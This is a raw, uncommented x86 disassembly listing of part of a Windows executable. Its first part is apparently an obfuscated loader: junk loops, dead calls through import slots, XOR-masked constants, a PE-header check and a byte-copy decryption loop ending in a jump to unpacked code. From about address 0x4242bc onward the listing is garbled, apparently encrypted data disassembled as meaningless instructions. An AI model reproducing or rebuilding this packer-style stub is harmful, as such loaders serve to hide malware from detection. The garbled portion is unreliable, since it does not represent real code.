  423dec:	pop    ebp
  423ded:	ret    0xc
  423df0:	push   ebp
  423df1:	mov    ebp,esp
  423df3:	sub    esp,0x10
  423df6:	mov    eax,0xf89c85a5
  423dfb:	mov    DWORD PTR ds:0x42b222,0x14
  423e05:	cmp    DWORD PTR ds:0x42b222,0x0
  423e0c:	je     0x423e66
  423e12:	cmp    DWORD PTR ds:0x42b222,0x9
  423e19:	jbe    0x423e66
  423e1f:	jmp    0x423e38
  423e24:	push   0x42a03d
  423e29:	push   0x1
  423e2b:	push   0x1
  423e2d:	push   0x14be
  423e32:	call   DWORD PTR ds:0x42b2ee
  423e38:	cmp    DWORD PTR ds:0x42b222,0xa
  423e3f:	jne    0x423e54
  423e45:	xor    edx,edx
  423e47:	add    edx,DWORD PTR ds:0x42b222
  423e4d:	dec    edx
  423e4e:	mov    DWORD PTR ds:0x42b222,edx
  423e54:	mov    edx,DWORD PTR ds:0x42b222
  423e5a:	dec    edx
  423e5b:	mov    DWORD PTR ds:0x42b222,edx
  423e61:	jmp    0x423e05
  423e66:	mov    DWORD PTR [ebp-0x4],eax
  423e69:	and    DWORD PTR ds:0x42b1fa,0x0
  423e73:	jmp    0x423e85
  423e78:	mov    edx,DWORD PTR ds:0x42b1fa
  423e7e:	inc    edx
  423e7f:	mov    DWORD PTR ds:0x42b1fa,edx
  423e85:	cmp    DWORD PTR ds:0x42b1fa,0x19
  423e8c:	jae    0x423ece
  423e92:	cmp    DWORD PTR ds:0x42b1fa,0xc
  423e99:	jg     0x423ece
  423e9f:	jmp    0x423eaf
  423ea4:	push   0x863f
  423ea9:	call   DWORD PTR ds:0x42b2f2
  423eaf:	cmp    DWORD PTR ds:0x42b1fa,0xb
  423eb6:	jne    0x423ec9
  423ebc:	mov    edx,DWORD PTR ds:0x42b1fa
  423ec2:	inc    edx
  423ec3:	mov    DWORD PTR ds:0x42b1fa,edx
  423ec9:	jmp    0x423e78
  423ece:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  423ed5:	mov    edx,DWORD PTR ds:0x42b1aa
  423edb:	or     edx,DWORD PTR ds:0x42b1da
  423ee1:	mov    DWORD PTR ds:0x42b1aa,edx
  423ee7:	mov    ecx,DWORD PTR [ebp-0x4]
  423eea:	not    edx
  423eec:	push   esi
  423eed:	and    edx,esi
  423eef:	mov    edx,0x75108ae
  423ef4:	xor    ecx,edx
  423ef6:	adc    DWORD PTR ds:0x42b18e,ebx
  423efc:	mov    esi,0x3272f5
  423f01:	and    DWORD PTR ds:0x42b186,0x14f5
  423f0b:	push   edi
  423f0c:	adc    edi,DWORD PTR ds:0x42b1c2
  423f12:	mov    edi,DWORD PTR [ebp+0x10]
  423f15:	xor    DWORD PTR ds:0x42b1fa,0x42b1ce
  423f1f:	add    ecx,esi
  423f21:	mov    DWORD PTR ds:0x42b1da,0x1b10
  423f2b:	cmp    ecx,edi
  423f2d:	mov    DWORD PTR ds:0x42b1d6,0x199
  423f37:	je     0x42401c
  423f3d:	xor    edi,ecx
  423f3f:	mov    ecx,DWORD PTR [ebp-0x4]
  423f42:	sbb    DWORD PTR ds:0x42b202,0x792c
  423f4c:	mov    edi,DWORD PTR [ebp+0x10]
  423f4f:	sub    DWORD PTR ds:0x42b1ba,0xd36
  423f59:	xor    eax,eax
  423f5b:	xor    ecx,edx
  423f5d:	xor    DWORD PTR ds:0x42b216,0x49be
  423f67:	add    ecx,esi
  423f69:	add    edi,0xfabdbed4
  423f6f:	adc    eax,0xffffffff
  423f72:	xor    eax,0x0
  423f75:	mov    DWORD PTR [ebp-0xc],eax
  423f78:	push   ebx
  423f79:	xor    ebx,ebx
  423f7b:	xor    edi,0x8a29a141
  423f81:	mov    eax,ecx
  423f83:	add    eax,0xfabdbed4
  423f88:	adc    ebx,0xffffffff
  423f8b:	xor    eax,0x8a29a141
  423f90:	xor    ebx,0x0
  423f93:	cmp    eax,edi
  423f95:	jne    0x423fae
  423f9b:	cmp    ebx,DWORD PTR [ebp-0xc]
  423f9e:	je     0x424016
  423fa4:	jmp    0x423fae
  423fa9:	mov    esi,0x3272f5
  423fae:	mov    eax,DWORD PTR [ebp-0x4]
  423fb1:	mov    edi,DWORD PTR [ebp-0x8]
  423fb4:	xor    edi,edx
  423fb6:	add    edi,esi
  423fb8:	mov    esi,DWORD PTR [ebp+0x8]
  423fbb:	imul   edi,ecx
  423fbe:	mov    ebx,DWORD PTR [ebp+0xc]
  423fc1:	xor    eax,edx
  423fc3:	add    eax,ecx
  423fc5:	mov    al,BYTE PTR [ebx+eax*1+0x3272f5]
  423fcc:	mov    BYTE PTR [edi+esi*1],al
  423fcf:	mov    eax,DWORD PTR [ebp-0x8]
  423fd2:	mov    esi,DWORD PTR [ebp+0x10]
  423fd5:	xor    eax,edx
  423fd7:	xor    ebx,ebx
  423fd9:	add    esi,0xfabdbed4
  423fdf:	adc    ebx,0xffffffff
  423fe2:	lea    ecx,[ecx+eax*1+0x3272f5]
  423fe9:	xor    edi,edi
  423feb:	xor    esi,0x8a29a141
  423ff1:	xor    ebx,0x0
  423ff4:	mov    eax,ecx
  423ff6:	add    eax,0xfabdbed4
  423ffb:	adc    edi,0xffffffff
  423ffe:	xor    eax,0x8a29a141
  424003:	xor    edi,0x0
  424006:	cmp    eax,esi
  424008:	jne    0x423fa9
  42400e:	cmp    edi,ebx
  424010:	jne    0x423fa9
  424016:	mov    eax,0xf89c85a2
  42401b:	pop    ebx
  42401c:	pop    edi
  42401d:	pop    esi
  42401e:	leave  
  42401f:	ret    0xc
  424022:	push   ebp
  424023:	mov    ebp,esp
  424025:	push   ecx
  424026:	and    DWORD PTR ds:0x42b19e,0x0
  424030:	jmp    0x424043
  424035:	xor    eax,eax
  424037:	xor    eax,DWORD PTR ds:0x42b19e
  42403d:	inc    eax
  42403e:	mov    ds:0x42b19e,eax
  424043:	cmp    DWORD PTR ds:0x42b19e,0x14
  42404a:	jae    0x424072
  424050:	cmp    DWORD PTR ds:0x42b19e,0x1e
  424057:	jg     0x424072
  42405d:	jmp    0x42406d
  424062:	push   0x42b182
  424067:	call   DWORD PTR ds:0x42b2f6
  42406d:	jmp    0x424035
  424072:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  424079:	and    DWORD PTR ds:0x42b1b2,0x0
  424083:	xor    ecx,ecx
  424085:	xor    ecx,DWORD PTR ds:0x42b1b2
  42408b:	inc    ecx
  42408c:	mov    DWORD PTR ds:0x42b1b2,ecx
  424092:	cmp    DWORD PTR ds:0x42b1b2,0x4
  424099:	jle    0x4240e5
  42409f:	jmp    0x4240be
  4240a4:	push   0x42b206
  4240a9:	push   0x42b1c6
  4240ae:	push   0x6e36
  4240b3:	push   0x42a0fe
  4240b8:	call   DWORD PTR ds:0x42b2fa
  4240be:	cmp    DWORD PTR ds:0x42b1b2,0x3
  4240c5:	jne    0x4240d8
  4240cb:	mov    ecx,DWORD PTR ds:0x42b1b2
  4240d1:	inc    ecx
  4240d2:	mov    DWORD PTR ds:0x42b1b2,ecx
  4240d8:	cmp    DWORD PTR ds:0x42b1b2,0x1b
  4240df:	jb     0x424083
  4240e5:	mov    eax,DWORD PTR [ebp+0x8]
  4240e8:	movsx  eax,BYTE PTR [eax]
  4240eb:	mov    edx,0x3272f5
  4240f0:	sub    eax,edx
  4240f2:	mov    ecx,0x75108ae
  4240f7:	xor    eax,ecx
  4240f9:	cmp    eax,0xf89c85f6
  4240fe:	jne    0x42412d
  424104:	mov    eax,DWORD PTR [ebp+0x8]
  424107:	push   esi
  424108:	mov    esi,DWORD PTR [ebp+0x8]
  42410b:	add    esi,DWORD PTR [eax+0x3c]
  42410e:	mov    DWORD PTR [ebp+0x8],esi
  424111:	mov    eax,DWORD PTR [ebp-0x4]
  424114:	mov    esi,DWORD PTR [ebp+0x8]
  424117:	xor    eax,ecx
  424119:	add    eax,edx
  42411b:	cmp    DWORD PTR [esi+0x54],eax
  42411e:	pop    esi
  42411f:	je     0x42412d
  424125:	mov    eax,DWORD PTR [ebp+0x8]
  424128:	jmp    0x424134
  42412d:	mov    eax,DWORD PTR [ebp-0x4]
  424130:	xor    eax,ecx
  424132:	add    eax,edx
  424134:	leave  
  424135:	ret    0x4
  424138:	push   ebp
  424139:	mov    ebp,esp
  42413b:	sub    esp,0xc
  42413e:	and    DWORD PTR ds:0x42b1c6,0x0
  424148:	jmp    0x42415a
  42414d:	mov    edx,DWORD PTR ds:0x42b1c6
  424153:	inc    edx
  424154:	mov    DWORD PTR ds:0x42b1c6,edx
  42415a:	cmp    DWORD PTR ds:0x42b1c6,0x1b
  424161:	jae    0x4241a8
  424167:	cmp    DWORD PTR ds:0x42b1c6,0xd
  42416e:	jle    0x4241a8
  424174:	jmp    0x424189
  424179:	push   0x42b216
  42417e:	push   0x42a1f3
  424183:	call   DWORD PTR ds:0x42b2fe
  424189:	cmp    DWORD PTR ds:0x42b1c6,0xc
  424190:	jne    0x4241a3
  424196:	mov    edx,DWORD PTR ds:0x42b1c6
  42419c:	inc    edx
  42419d:	mov    DWORD PTR ds:0x42b1c6,edx
  4241a3:	jmp    0x42414d
  4241a8:	push   esi
  4241a9:	and    DWORD PTR ds:0x42b222,0x0
  4241b3:	xor    esi,esi
  4241b5:	or     esi,DWORD PTR ds:0x42b222
  4241bb:	inc    esi
  4241bc:	mov    DWORD PTR ds:0x42b222,esi
  4241c2:	cmp    DWORD PTR ds:0x42b222,0x7
  4241c9:	jl     0x424211
  4241cf:	jmp    0x4241ea
  4241d4:	push   DWORD PTR [ebp-0x28]
  4241d7:	push   DWORD PTR [ebp-0x24]
  4241da:	push   0x42a1b7
  4241df:	push   0x400000
  4241e4:	call   DWORD PTR ds:0x42b306
  4241ea:	cmp    DWORD PTR ds:0x42b222,0x6
  4241f1:	jne    0x424204
  4241f7:	mov    esi,DWORD PTR ds:0x42b222
  4241fd:	inc    esi
  4241fe:	mov    DWORD PTR ds:0x42b222,esi
  424204:	cmp    DWORD PTR ds:0x42b222,0x15
  42420b:	jb     0x4241b3
  424211:	mov    esi,0xf89c85a5
  424216:	or     DWORD PTR ds:0x42b1d6,0x459e
  424220:	mov    DWORD PTR [ebp-0x8],esi
  424223:	and    DWORD PTR ds:0x42b1d6,0x0
  42422d:	jmp    0x424241
  424232:	xor    ecx,ecx
  424234:	xor    ecx,DWORD PTR ds:0x42b1d6
  42423a:	inc    ecx
  42423b:	mov    DWORD PTR ds:0x42b1d6,ecx
  424241:	cmp    DWORD PTR ds:0x42b1d6,0x1c
  424248:	jae    0x42428f
  42424e:	cmp    DWORD PTR ds:0x42b1d6,0xf
  424255:	jge    0x42428f
  42425b:	jmp    0x424270
  424260:	push   0x42a1a1
  424265:	push   0x0
  424267:	push   DWORD PTR [ebp-0x20]
  42426a:	call   DWORD PTR ds:0x42b30e
  424270:	cmp    DWORD PTR ds:0x42b1d6,0xe
  424277:	jne    0x42428a
  42427d:	mov    ecx,DWORD PTR ds:0x42b1d6
  424283:	inc    ecx
  424284:	mov    DWORD PTR ds:0x42b1d6,ecx
  42428a:	jmp    0x424232
  42428f:	mov    DWORD PTR [ebp-0x4],0xf89c85a2
  424296:	push   edi
  424297:	mov    eax,eax
  424299:	mov    eax,DWORD PTR [ebp-0x4]
  42429c:	mov    edi,DWORD PTR [ebp-0x8]
  42429f:	mov    ecx,0x75108ae
  4242a4:	xor    eax,ecx
  4242a6:	xor    edi,ecx
  4242a8:	mov    edx,0x3272f5
  4242ad:	add    edi,edx
  4242af:	add    eax,edx
  4242b1:	imul   eax,edi
  4242b4:	mov    edi,DWORD PTR [ebp+0xc]
  4242b7:	jmp    0x425886
  4242bc:	jge    0x42427f
  4242be:	jnp    0x42427a
  4242c0:	mov    bh,0xb2
  4242c2:	mov    dl,0xbe
  4242c4:	jmp    0x172776ec
  4242c9:	push   es
  4242ca:	mov    WORD PTR [edx-0x6e],?
  4242cd:	xchg   ebp,eax
  4242ce:	add    BYTE PTR [ebx-0x7c7c932f],0x68
  4242d5:	call   DWORD PTR [ebp-0x48]
  4242d8:	xor    DWORD PTR [ebx+0x25284823],edi
  4242de:	mov    bl,0x72
  4242e0:	xchg   BYTE PTR [edx+0x4ee39693],bh
  4242e6:	dec    esp
  4242e7:	jno    0x42431d
  4242e9:	inc    esi
  4242ea:	fwait
  4242eb:	xchg   esp,eax
  4242ec:	shr    DWORD PTR [edi+0x52230d0e],0x98
  4242f3:	retf   
  4242f4:	stc    
  4242f5:	mov    eax,0xf479befc
  4242fa:	imul   ebp,DWORD PTR [edi],0x75
  4242fd:	fld    TBYTE PTR [ecx]
  4242ff:	lds    edi,FWORD PTR [eax]
  424301:	mov    esp,0x6a862151
  424306:	sub    esp,0x67
  424309:	and    cl,bl
  42430b:	int3   
  42430c:	mov    edx,0x8d50ebd7
  424311:	aaa    
  424312:	mov    al,ds:0x447c42f3
  424317:	ds lock xor al,0x74
  42431b:	pushfw 
  42431d:	int    0xf4
  42431f:	mov    esp,0x6363c351
  424324:	inc    edi
  424325:	mov    ebx,DWORD PTR [edi-0x426b1778]
  42432b:	xor    eax,0xd324b06a
  424330:	popf   
  424331:	scas   al,BYTE PTR es:[edi]
  424332:	jne    0x4242c7
  424334:	pop    ebx
  424335:	test   DWORD PTR [eax-0x77],esi
  424338:	cmp    DWORD PTR [esi],0xffffffa0
  42433b:	mov    bl,0x59
  42433d:	ss inc edx
  42433f:	iret   
  424340:	adc    ah,BYTE PTR [ecx+0x2]
  424343:	pop    esp
  424344:	stos   DWORD PTR es:[edi],eax
  424345:	popa   
  424346:	xchg   DWORD PTR cs:[edx+0x5b],ecx
  42434a:	pop    ebx
  42434b:	mov    DWORD PTR [edx+0x33],ecx
  42434e:	aaa    
  42434f:	jbe    0x42438a
  424351:	inc    esi
  424352:	or     al,0xe8
  424354:	lea    ebx,[ecx+0x20]
  424357:	mov    ds:0x805dec98,eax
  42435c:	(bad)  
  42435e:	aaa    
  42435f:	cmp    eax,0xba8a8af7
  424364:	jecxz  0x42437d
  424366:	bnd ret 
  424368:	pop    esi
  424369:	jno    0x42433f
  42436b:	inc    esi
  42436c:	xor    bh,BYTE PTR [eax]
  42436e:	lahf   
  42436f:	je     0x424319
  424371:	lock js 0x42434c
  424374:	mov    ah,0x8e
  424376:	mov    al,ds:0xd76c109d
  42437b:	lods   al,BYTE PTR ds:[esi]
  42437c:	push   0x2726d3f5
  424381:	cdq    
  424382:	adc    edi,DWORD PTR [ebp-0x5b]
  424385:	xchg   DWORD PTR [ebp-0x567457fb],ebp
  42438b:	pusha  
  42438c:	outs   dx,BYTE PTR ds:[esi]
  42438d:	sub    esp,DWORD PTR [edx+0x78]
  424390:	js     0x424335
  424392:	out    0x2e,al
  424394:	js     0x4243b0
  424396:	sub    eax,0xe689c6b5
  42439b:	add    BYTE PTR [edi],ch
  42439d:	add    ecx,DWORD PTR [edi+0x70ab22ad]
  4243a3:	int    0x28
  4243a5:	or     BYTE PTR [ecx+0x47062eb8],bh
  4243ab:	jns    0x424361
  4243ad:	stos   BYTE PTR es:[edi],al
  4243ae:	idiv   BYTE PTR [esi]
  4243b0:	mov    edx,0x2489e0c9
  4243b5:	xchg   esi,ebx
  4243b7:	or     esp,esi
  4243b9:	daa    
  4243ba:	lock out dx,al
  4243bc:	mov    al,0x9e
  4243be:	or     BYTE PTR [eax],0xc2
  4243c1:	push   edx
  4243c2:	repnz out dx,eax
  4243c4:	xor    ch,ch
  4243c6:	popf   
  4243c7:	dec    ebx
  4243c8:	rcr    bh,cl
  4243ca:	ja     0x424360
  4243cc:	pop    eax
  4243cd:	js     0x42438a
  4243cf:	test   BYTE PTR es:[edi-0x155c1596],0x42
  4243d7:	imul   eax,DWORD PTR [edi+0xb],0xe84e6264
  4243de:	sti    
  4243df:	lods   al,BYTE PTR ds:[esi]
  4243e0:	clc    
  4243e1:	mov    bh,0x5b
  4243e3:	xchg   ebx,eax
  4243e4:	shr    BYTE PTR [eax+0x6d],0x28
  4243e8:	xor    al,0x28
  4243ea:	aaa    
  4243eb:	lds    ebp,FWORD PTR [edx+0x7b]
  4243ee:	mov    al,0x3f
  4243f0:	mov    ds:0x7faa377c,eax
  4243f5:	out    0x66,eax
  4243f7:	xchg   edx,eax
  4243f8:	push   0x398c1ef0
  4243fd:	(bad)  
  4243fe:	je     0x4243a3
  424400:	call   0x81884d99
  424405:	add    eax,0x625d63a8
  42440a:	repz xchg ebp,eax
  42440c:	sub    DWORD PTR [ecx+0x15],esi
  42440f:	sbb    bh,BYTE PTR [edi+0x48]
  424412:	xor    esi,ebx
  424414:	mov    ch,0x65
  424416:	sbb    al,0x16
  424418:	mov    esi,0xd652831d
  42441d:	lds    esi,FWORD PTR [ebp+0x14]
  424420:	sub    al,0xeb
  424422:	or     eax,0x80939218
  424427:	test   BYTE PTR [esi-0x7319933a],al
  42442d:	fnstsw WORD PTR [ebx-0xb]
  424430:	and    DWORD PTR [edx],0x395b0802
  424436:	inc    ebx
  424437:	fnstcw WORD PTR [edi-0x3be0f5ba]
  42443d:	(bad)  
  42443e:	jl     0x424456
  424440:	adc    BYTE PTR [ebx-0x80],bl
  424443:	inc    ebx
  424444:	push   ebp
  424445:	cwde   
  424446:	daa    
  424447:	out    0x4f,eax
  424449:	sbb    eax,DWORD PTR [edx-0xf962a6a]
  42444f:	das    
  424450:	sbb    dh,BYTE PTR [edi]
  424452:	lahf   
  424453:	outs   dx,DWORD PTR ds:[esi]
  424454:	jmp    0xc473129e
  424459:	ds aaa 
  42445b:	icebp  
  42445c:	(bad)  
  42445d:	mov    bl,0x5c
  42445f:	push   ss
  424460:	xchg   ebx,eax
  424461:	scas   eax,DWORD PTR es:[edi]
  424462:	sub    DWORD PTR [edx+eiz*8+0x0],edi
  424466:	test   BYTE PTR [ecx-0xf90beb8],cl
  42446c:	aam    0x2b
  42446e:	jle    0x4244d0
  424470:	loopne 0x4244aa
  424472:	fdivp  st(2),st
  424474:	lds    ebp,FWORD PTR [ebx-0x30386b69]
  42447a:	repnz xchg ebp,eax
  42447c:	xor    esi,DWORD PTR [edx-0x46dfcb76]
  424482:	jmp    0x558c61a4
  424487:	mov    bl,0x93
  424489:	pop    es
  42448a:	push   ebx
  42448b:	jno    0x42449d
  42448d:	sub    ch,dh
  42448f:	xor    eax,0x8311b3ac
  424494:	out    0xb6,eax
  424496:	test   DWORD PTR [eax],0x8217c497
  42449c:	sbb    ecx,DWORD PTR [esi+eax*1+0x1a72a357]
  4244a3:	arpl   bx,si
  4244a5:	jle    0x4244cf
  4244a7:	mov    ebp,0x85f11d60
  4244ac:	sbb    ebp,ebp
  4244ae:	pop    esi
  4244af:	jmp    0xec7ed957
  4244b4:	inc    esp
  4244b5:	or     ch,BYTE PTR [ecx+0x49]
  4244b8:	dec    ebp
  4244b9:	sub    ah,BYTE PTR [eax+0x25]
  4244bc:	mov    ch,dl
  4244be:	imul   esi,DWORD PTR [edx+esi*8+0x74],0x133b211c
  4244c6:	dec    ebp
  4244c7:	xor    eax,0xea61eda9
  4244cc:	lea    edx,[esi]
  4244ce:	into   
  4244cf:	pop    ss
  4244d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244d1:	lahf   
  4244d2:	mov    edx,DWORD PTR [esi+esi*1+0x54b91024]
  4244d9:	jmp    0x42446b
  4244db:	or     BYTE PTR [esi*1-0x6f276f29],0x3b
  4244e3:	loope  0x4244fe
  4244e5:	ds stos BYTE PTR es:[edi],al
  4244e7:	inc    esi
  4244e8:	jmp    0xe774:0x78a54afe
  4244ef:	push   ss
  4244f0:	(bad)  
  4244f1:	cmc    
  4244f2:	test   BYTE PTR [edx+0x193afa03],bh
  4244f8:	nop
  4244f9:	jne    0x42455a
  4244fb:	adc    ebx,DWORD PTR [eax-0x2b253a6e]
  424501:	call   0xb3a9:0xd46f6d18
  424508:	jno    0x424538
  42450a:	out    0xc,al
  42450c:	sar    DWORD PTR [edi+0x6c],cl
  42450f:	test   DWORD PTR [ebx+ecx*2+0x351b7fc6],ebx
  424516:	aaa    
  424517:	cmp    dh,0x10
  42451a:	cmp    al,0x7a
  42451c:	mov    ds:0x9501fde3,al
  424521:	mov    ds:0xae694a80,eax
  424526:	jb     0x424560
  424528:	mov    esp,DWORD PTR [ebp+0x6de08d8d]
  42452e:	lods   eax,DWORD PTR ds:[esi]
  42452f:	retf   
  424530:	loope  0x424593
  424532:	pop    es
  424533:	clc    
  424534:	push   ds
  424535:	xchg   ebx,eax
  424536:	xor    bl,0xcb
  424539:	cmp    BYTE PTR [edx+0x27fc4057],dl
  42453f:	rcl    DWORD PTR [esi-0x2],cl
  424542:	sbb    BYTE PTR [edx],ch
  424544:	mov    dl,0x61
  424546:	mov    bh,0xd0
  424548:	pop    esp
  424549:	mov    DWORD PTR [esi+0x4e7189fe],ebp
  42454f:	das    
  424550:	inc    ebp
  424551:	mov    ah,0x2b
  424553:	mov    ecx,0x9c8939cc
  424558:	enter  0xcb1f,0xe6
  42455c:	shl    DWORD PTR [edx-0x7192eba6],1
  424562:	es push cs
  424564:	(bad)
  424567:	leave  
  424568:	shl    DWORD PTR [ecx-0xbc12ba7],1
  42456e:	push   es
  42456f:	sbb    dl,BYTE PTR [bp+di]
  424572:	mov    esp,0x626bb94f
  424577:	jno    0x42458d
  424579:	aad    0xae
  42457b:	mov    al,ds:0x92657c17
  424580:	sbb    DWORD PTR fs:[ebx+0x14],ecx
  424584:	(bad)  
  424585:	xchg   ebx,eax
  424586:	mov    bh,dh
  424588:	jnp    0x424545
  42458a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42458b:	shl    DWORD PTR [esi+eiz*4],1
  42458e:	iret   
  42458f:	inc    ebp
  424590:	mov    ebp,0xb215b404
  424595:	sbb    al,0x8
  424597:	test   al,0xa5
  424599:	and    dh,cl
  42459b:	and    ah,BYTE PTR [edx]
  42459d:	jo     0x424609
  42459f:	shl    BYTE PTR [esi],0x81
  4245a2:	pop    ecx
  4245a3:	and    BYTE PTR [edi],ah
  4245a5:	js     0x4245ad
  4245a7:	and    BYTE PTR [eax-0x584ace3e],ah
  4245ad:	xchg   edx,eax
  4245ae:	inc    ebx
  4245af:	sub    al,0x2b
  4245b1:	cmp    eax,eax
  4245b3:	stc    
  4245b4:	jmp    0xa0ac5fc2
  4245b9:	fistp  QWORD PTR [ecx+ebx*1]
  4245bc:	in     al,dx
  4245bd:	mov    bh,0xed
  4245bf:	xor    esp,DWORD PTR [ebp-0x708ca48e]
  4245c5:	fidiv  WORD PTR [ebx]
  4245c7:	aad    0x49
  4245c9:	enter  0x1a8a,0x80
  4245cd:	sub    BYTE PTR [edi],dl
  4245cf:	ret    
  4245d0:	cli    
  4245d1:	idiv   BYTE PTR [ebp+0x4b]
  4245d4:	mov    edx,0xc353f804
  4245d9:	xor    eax,0xef90a1af
  4245de:	dec    eax
  4245df:	pop    ecx
  4245e0:	mov    ah,al
  4245e2:	fstp   DWORD PTR [ebp+eax*8+0x54]
  4245e6:	mov    dl,0xeb
  4245e8:	pop    ebp
  4245e9:	mov    al,ds:0x37d6e9a1
  4245ee:	test   BYTE PTR [ebx],ah
  4245f0:	lods   al,BYTE PTR ds:[esi]
  4245f1:	popf   
  4245f2:	pop    ds
  4245f3:	test   DWORD PTR [eax-0x72],0x4e8d4dd3
  4245fa:	scas   al,BYTE PTR es:[edi]
  4245fb:	retf   0xd79c
  4245fe:	(bad)  
  4245ff:	sbb    BYTE PTR [edx-0x7f],bl
  424602:	loopne 0x42467d
  424604:	push   esi
  424605:	and    al,0x5e
  424607:	adc    esi,DWORD PTR [eax+0x64c54008]
  42460d:	test   DWORD PTR [esi-0x74e39a9e],0x91e0ac5a
  424617:	sbb    eax,0x9dd82d74
  42461c:	pop    ds
  42461d:	mov    dl,0x5e
  42461f:	mov    DWORD PTR [edi+0x68],edi
  424622:	sub    BYTE PTR [edi+0x7e],bh
  424625:	enter  0xd77a,0xea
  424629:	cmp    DWORD PTR [ecx],ecx
  42462b:	mov    esi,0xe3287ec2
  424630:	pop    esp
  424631:	sub    BYTE PTR [esi],dh
  424633:	or     BYTE PTR [edi-0x60],bh
  424636:	pop    ss
  424637:	lahf   
  424638:	(bad)
  42463b:	add    eax,0xe8270760
  424641:	sub    edi,DWORD PTR [edi]
  424643:	jp     0x42466a
  424645:	or     al,0x40
  424647:	int    0x7c
  424649:	repz lds ecx,FWORD PTR ds:0x6543d32c
  424650:	retf   
  424651:	push   eax
  424652:	cmc    
  424653:	dec    esp
  424654:	mov    bh,0xcd
  424656:	mov    edi,0x5056c8bf
  42465b:	xchg   edi,eax
  42465c:	mov    ah,0x76
  42465e:	into   
  42465f:	add    al,0xf4
  424661:	mov    bh,0x76
  424663:	dec    eax
  424664:	push   eax
  424665:	xor    ebx,edx
  424667:	imul   eax,esp,0xffffffd6
  42466a:	and    eax,0x4ab41cec
  42466f:	call   FWORD PTR [ebx]
  424671:	test   al,0xc0
  424673:	shl    DWORD PTR [esp+eiz*2-0x32],0x43
  424678:	cdq    
  424679:	xchg   esp,eax
  42467a:	sub    ecx,DWORD PTR [ebx+0x10]
  42467d:	outs   dx,DWORD PTR ds:[esi]
  42467e:	rol    BYTE PTR [ecx],0x68
  424681:	mov    eax,ds:0x4cbd8265
  424686:	push   esi
  424687:	cmp    BYTE PTR [eax+0x72f5bd51],bl
  42468d:	gs pop ecx
  42468f:	dec    esp
  424690:	int    0xb0
  424692:	nop
  424693:	inc    esp
  424694:	les    edx,FWORD PTR ds:0xa8ba5930
  42469a:	push   ebp
  42469b:	lock push ebp
  42469d:	cld    
  42469e:	jle    0x42471f
  4246a0:	sbb    DWORD PTR [ecx+0x3d],esi
  4246a3:	inc    ebx
  4246a4:	xor    BYTE PTR [edi+0x32b7f76a],0x8e
  4246ab:	stos   DWORD PTR es:[edi],eax
  4246ac:	xlat   BYTE PTR ds:[ebx]
  4246ad:	iret   
  4246ae:	inc    esp
  4246af:	aam    0xe2
  4246b1:	add    BYTE PTR [ecx+0x7b],cl
  4246b4:	cli    
  4246b5:	push   edi
  4246b6:	jmp    0x5430:0xbbd0c1f8
  4246bd:	inc    esi
  4246be:	dec    esp
  4246bf:	push   edi
  4246c0:	fistp  DWORD PTR [edi+0x61]
  4246c3:	jmp    0x424676
  4246c5:	push   es
  4246c6:	xchg   esp,eax
  4246c7:	dec    ebx
  4246c8:	jecxz  0x4246ba
  4246ca:	fidivr WORD PTR [ecx+0x48]
  4246cd:	addr16 push ss
  4246cf:	inc    dl
  4246d1:	addr16 mov cl,0xfa
  4246d4:	xchg   BYTE PTR [ebx+0x10f89e57],ah
  4246da:	inc    edi
  4246db:	sbb    esi,esi
  4246dd:	cmp    al,0xb5
  4246df:	jbe    0x42475d
  4246e1:	xchg   ecx,eax
  4246e2:	pop    es
  4246e3:	ins    DWORD PTR es:[edi],dx
  4246e4:	loopne 0x424687
  4246e6:	and    BYTE PTR [esi],dl
  4246e8:	jno    0x4246d5
  4246ea:	out    dx,al
  4246eb:	fimul  WORD PTR [edx]
  4246ed:	inc    eax
  4246ee:	sbb    eax,0x5310db66
  4246f3:	cmp    ecx,ebx
  4246f5:	push   es
  4246f6:	jnp    0x42468d
  4246f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246f9:	bound  eax,QWORD PTR [esi+ecx*8]
  4246fc:	mov    ecx,0xba6b7881
  424701:	sbb    eax,0x4ee789d8
  424706:	icebp  
  424707:	out    dx,eax
  424708:	xchg   esi,eax
  424709:	jae    0x42475d
  42470b:	pop    ecx
  42470c:	mov    eax,ds:0xeb7ee04
  424711:	xor    eax,DWORD PTR [ecx-0x61]
  424714:	inc    edi
  424715:	push   esi
  424716:	inc    ecx
  424717:	mov    cl,0x56
  424719:	jae    0x42469f
  42471b:	out    0xff,al
  42471d:	pushf  
  42471e:	stos   DWORD PTR es:[edi],eax
  42471f:	sbb    al,0x6a
  424721:	and    BYTE PTR [esi-0x314374cb],ah
  424727:	aaa    
  424728:	or     eax,0x16d957a0
  42472d:	je     0x42478a
  42472f:	fldenv [edx+0x6f]
  424732:	scas   eax,DWORD PTR es:[edi]
  424733:	sbb    eax,0xf544173e
  424738:	mov    WORD PTR [edx-0x1b],?
  42473b:	fisttp WORD PTR [ebx-0x19]
  42473e:	pushf  
  42473f:	xchg   ebp,eax
  424740:	push   cs
  424741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424742:	push   ecx
  424743:	imul   ebx,ecx,0xffffffdd
  424746:	into   
  424747:	or     DWORD PTR [edi-0x1],edx
  42474a:	ins    DWORD PTR es:[edi],dx
  42474b:	sbb    al,0x6e
  42474d:	mov    al,0x1c
  42474f:	inc    edi
  424750:	pop    ebx
  424751:	idiv   BYTE PTR [edx-0x31f945fa]
  424757:	xchg   edi,eax
  424758:	sub    DWORD PTR [ecx+0x5e],esi
  42475b:	adc    BYTE PTR fs:[edx-0xf37b182],ch
  424762:	push   0x5e31bf12
  424767:	and    edi,edx
  424769:	inc    eax
  42476a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42476b:	cmc    
  42476c:	mov    esp,0x1d5991dc
  424771:	sub    al,cl
  424773:	xchg   ebx,eax
  424774:	mov    bl,BYTE PTR [esi+esi*8+0x4440fdfc]
  42477b:	ret    0x498e
  42477e:	fsub   DWORD PTR [ebp+0x62847194]
  424784:	push   edx
  424785:	out    0x6a,eax
  424787:	mov    ds:0x35b7b0a9,eax
  42478c:	mov    ds:0xe54223c1,eax
  424791:	mov    dl,0x68
  424793:	jl     0x4247f2
  424795:	fstp   DWORD PTR [eax]
  424797:	xchg   dh,bh
  424799:	xchg   dh,al
  42479b:	xchg   esp,eax
  42479c:	es mov edi,0xd30caa07
  4247a2:	pop    ds
  4247a3:	jp     0x4247d0
  4247a5:	pop    ss
